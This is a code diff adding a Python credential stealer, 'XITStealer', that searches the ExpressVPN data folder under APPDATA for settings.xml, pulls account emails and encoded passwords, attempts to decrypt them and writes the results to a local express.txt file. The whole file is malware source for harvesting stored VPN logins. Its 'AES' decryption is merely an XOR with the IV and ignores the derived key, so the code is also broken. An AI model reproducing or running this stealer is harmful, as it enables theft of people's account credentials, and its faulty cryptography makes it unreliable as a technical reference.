@@ -1,0 +1,74 @@
+import os
+import base64
+import xml.etree.ElementTree as ET
+import hashlib
+
+class XITStealer:
+    def __init__(self):
+        self.entropy = bytes([0x50, 0x44, 0x46, 0x6d, 0x6d, 0x4d, 0x44, 0x5f, 0x7b, 0x40, 0x26, 0x7b, 0x34, 0x2b, 0x3d, 0x50, 0x3a, 0x3f, 0x49, 0x20, 0x26, 0x20, 0x5f, 0x23, 0x21, 0x40, 0x2e, 0x23, 0x27, 0x20, 0x2f])
+
+    def decrypt(self, encoded_data):
+        try:
+            protected_data = base64.b64decode(encoded_data)
+            key = self.derive_key(b"password", self.entropy)
+            iv = protected_data[:16]
+            cipher_text = protected_data[16:]
+            decrypted_data = self.aes_cfb_decrypt(key, iv, cipher_text)
+            return decrypted_data.decode("utf-8")
+        except:
+            return ""
+
+    def derive_key(self, password, salt):
+        key = bytearray()
+        while len(key) < 32:
+            key += hashlib.pbkdf2_hmac("sha256", password, salt, 100000, dklen=32)
+        return key[:32]
+
+    def aes_cfb_decrypt(self, key, iv, cipher_text):
+        decrypted = bytearray()
+        block_size = 16
+        for i in range(0, len(cipher_text), block_size):
+            block = cipher_text[i:i + block_size]
+            cipher_block = bytearray(len(block))
+            for j in range(len(block)):
+                cipher_block[j] = block[j] ^ iv[j]
+            decrypted += cipher_block
+            iv = block
+        return decrypted
+
+    def express_xitstealer(self):
+        express_dir = os.path.join(os.getenv("APPDATA"), "ExpressVPN")
+
+        if not os.path.exists(express_dir):
+            return
+
+        try:
+            accounts = []
+
+            for root, _, files in os.walk(express_dir):
+                for file in files:
+                    if file == "settings.xml":
+                        account_file = os.path.join(root, file)
+                        tree = ET.parse(account_file)
+                        root_element = tree.getroot()
+
+                        accounts_element = root_element.find(".//UserConfig/AccountSettings")
+                        if accounts_element is not None:
+                            for account_element in accounts_element.findall("Account"):
+                                username = account_element.find("Email").text
+                                encoded_password = account_element.find("Password").text
+
+                                if username and encoded_password:
+                                    password = self.decrypt(encoded_password)
+                                    accounts.append(f"Username: {username}\nPassword: {password}\n")
+
+            if accounts:
+                output_path = os.path.join(os.getcwd(), "express.txt")
+                with open(output_path, "w") as output_file:
+                    output_file.writelines(accounts)
+        except:
+            pass
+
+if __name__ == "__main__":
+    xit_stealer = XITStealer()
+    xit_stealer.express_xitstealer()
